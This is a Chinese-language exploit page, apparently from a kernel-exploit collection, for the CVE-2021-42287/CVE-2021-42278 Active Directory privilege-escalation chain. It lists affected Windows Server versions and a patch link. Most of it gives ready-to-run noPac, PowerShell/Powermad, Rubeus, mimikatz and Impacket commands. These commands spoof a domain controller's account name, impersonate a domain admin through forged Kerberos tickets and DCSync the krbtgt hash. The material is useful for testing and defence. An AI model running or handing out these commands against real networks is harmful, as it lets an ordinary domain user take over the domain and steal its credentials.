### CVE-2021-42287

#### 描述

CVE-2021-42287/CVE-2021-42278组合拳能够通过普通用户权限账号，拿下Microsoft Windows Active Directory域服务管理员权限账号

#### 影响版本

| Product             | CPU Architecture | Version | Update | Tested   |
| ------------------- | ---------------- | ------- | ------ | -------- |
| Windows Server 2008 | x86/x64          |         | SP2    |          |
| Windows Server 2008 | x64              | R2      | SP1    |          |
| Windows Server 2012 |                  |         |        | &#10004; |
| Windows Server 2012 |                  | R2      |        |          |
| Windows Server 2016 |                  |         |        |          |
| Windows Server 2019 |                  |         |        |          |
| Windows Server 2022 |                  |         |        |          |
| Windows Server      |                  | 2004    |        |          |
| Windows Server      |                  | 20H2    |        |          |

#### 修复补丁

```
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-42287
```

#### 利用方式

编译环境

- VS2019（.NET Framework 4.0）AnyCPU Release

> 演示使用的是noPac项目进行

漏洞利用前置条件，以及注意点

- 能够添加机器普通⽤户 （MachineAccountQuota默认为10，值为0意味着普通⽤户⽆法创建机器账 户，也就⽆法直接利⽤这个漏洞）

  <img src="https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-42287_0x01.png" alt="12" style="zoom:50%;" />

- 还有noPac这个工具是模拟域管administrator，但是如果域内管理员组中不存在这个⽤户ptt后会报错，需要通过`/IMPERSONATE domain_admin_user` 来进行指定管理员，报错如下

  ![image-20211214141231851](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-42287_0x02.png)

首先获取域中的管理员账号

```powershell
net group "domain admins" /domain
```

获取管理员账号后执行如下命令

```powershell
.\noPac.exe -domain <域名> -user <能添加普通账户的账号> -pass <能添加普通账户的密码>  /dc <域控机器>  /mAccount <你想添加到域中的账号> /mPassword <你想添加到域中的密码> /service <票据的服务名> /IMPERSONATE <获取到的域管理员账号> /ptt
```

几个参数解释一下，票据服务名一般用cifs即可

```
域名：cn.ascotbe.test.com
域控机器：DC1.cn.ascotbe.test.com
票据的服务名：cifs
```

![image-20211214142856348](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-42287_0x03.png)

然后通过执行以下命令来验证

```powershell
#查看票据
klist
#获取C盘文件
dir \\dc\c$
```

![image-20211214143041849](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-42287_0x04.png)

> 使用sam-the-admin项目

没测试，想用可以通过-h来查看命令

> 使用命令行执行

windows

```powershell
# 0. create a computer account
Import-Module .\Powermad.ps1

$password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose

# 1. clear its SPNs
Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose

# 2. rename the computer (computer -> DC)
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose

# 3. obtain a TGT
Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local" /dc:"DomainController.domain.local" /nowrap

# 4. reset the computer name
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose

# 5. obtain a service ticket with S4U2self by presenting the previous TGT
Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]

# 6. DCSync
(mimikatz) lsadump::dcsync /domain:domain.local /kdc:DomainController.domain.local /user:krbtgt
```

linux

```bash
# 0. create a computer account
addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'

# 1. clear its SPNs
addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController

# 2. rename the computer (computer -> DC)
renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'

# 3. obtain a TGT
getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'

# 4. reset the computer name
renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'

# 5. obtain a service ticket with S4U2self by presenting the previous TGT
KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'

# 6. DCSync by presenting the service ticket
KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'
```



#### 参考项目

- [GhostPack](https://github.com/GhostPack/Rubeus)
- [Kevin-Robertson]( https://github.com/Kevin-Robertson/Powermad)
- [cube0x0](https://github.com/cube0x0/noPac)
- [sam-the-admin](https://github.com/WazeHell/sam-the-admin)

#### 分析文章

- [CVE-2021-42287/CVE-2021-42278 Weaponisation](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
